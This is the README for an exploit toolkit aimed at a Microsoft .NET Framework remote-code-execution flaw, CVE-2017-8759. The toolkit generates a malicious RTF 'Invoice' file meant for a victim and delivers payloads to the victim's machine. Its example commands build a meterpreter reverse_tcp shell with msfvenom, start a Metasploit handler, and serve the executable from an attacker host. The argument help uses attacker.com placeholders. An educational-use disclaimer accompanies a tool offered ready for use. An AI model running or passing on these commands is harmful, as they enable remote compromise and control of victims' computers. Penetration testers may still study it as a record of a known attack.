## Exploit toolkit CVE-2017-8759 - v1.0

Exploit toolkit CVE-2017-8759 - v1.0 is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft .NET Framework RCE. It could generate a malicious RTF file and deliver metasploit / meterpreter / other payload to victim without any complex configuration. 

### Disclaimer

This program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that me (bhdresh) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using this program you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not bhdresh's responsibility.

Finally, this is a personal development, please respect its philosophy and don't use it for bad things!

### Licence

CC BY 4.0 licence - https://creativecommons.org/licenses/by/4.0/

### Release note:

Introduced following capabilities to the script

	- Generate Malicious RTF file
	- Exploitation mode for generated RTF file

Version: Python version 2.7.13

### Scenario: Deliver local meterpreter payload
###### Video Tutorial: https://www.youtube.com/watch?v=46jEa1bmORM
###### Example commands
	1) Generate malicious RTF file
	   # python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.56.1/logo.txt
	2) (Optional, if using MSF Payload) : Generate metasploit payload and start handler
	   # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe > /tmp/shell.exe
	   # msfconsole -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.1; run"
	3) Start toolkit in exploit mode to deliver local payload
	   # python cve-2017-8759_toolkit.py -M exp -e http://192.168.56.1/shell.exe -l /tmp/shell.exe

### Command line arguments:

    # python cve-2017-8759_toolkit.py -h

    This is a handy toolkit to exploit CVE-2017-8759 (Microsoft .NET Framework RCE)

    Modes:

    -M gen                                          Generate Malicious file only

         Generate malicious RTF file:

          -w <Filename.rtf>                   Name of malicious RTF file (Share this file with victim).

          -u <http://attacker.com/test.txt>   Path of remote txt file. Normally, this should be a domain or IP where this                                          tool is running.
	                                          For example, http://attackerip.com/test.txt (This URL will be included in 	                                              malicious RTF file and will be requested once victim will open malicious RTF file.

					      
    -M exp                                          Start exploitation mode

         Exploitation:
	  
          -p <TCP port:Default 80>            Local port number.

          -e <http://attacker.com/shell.exe>  The path of an executable file / meterpreter shell / payload  which needs to be executed on target.

          -l </tmp/shell.exe>                 Specify local path of an executable file / meterpreter shell / payload.

### Author

@bhdresh

### Credit

@Voulnet, @vysec, @bhdresh

### Bug, issues, feature requests

Obviously, I am not a fulltime developer so expect some hiccups

Please report bugs, issues through https://github.com/bhdresh/CVE-2017-8759/issues/new
